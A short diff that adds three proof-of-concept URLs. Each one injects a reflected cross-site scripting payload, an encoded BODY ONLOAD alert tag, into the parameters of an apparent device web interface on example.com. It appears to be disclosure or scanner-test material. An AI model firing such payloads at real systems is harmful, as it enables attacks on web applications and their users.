@@ -1,0 +1,3 @@
+http://www.example.com/help/help?%3CBODY%20ONLOAD=alert(&#039;www.eazel.es&#039;)%3E
+http://www.example.com/control/events.tar?source_ip=%3CBODY%20ONLOAD=alert(&#039;www.eazel.es&#039;)%3E&amp;download=egal
+http://www.example.com/control/eventplayer?get_image_info_abspath=%3CBODY%20ONLOAD=alert(&#039;www.eazel.es&#039;)%3E
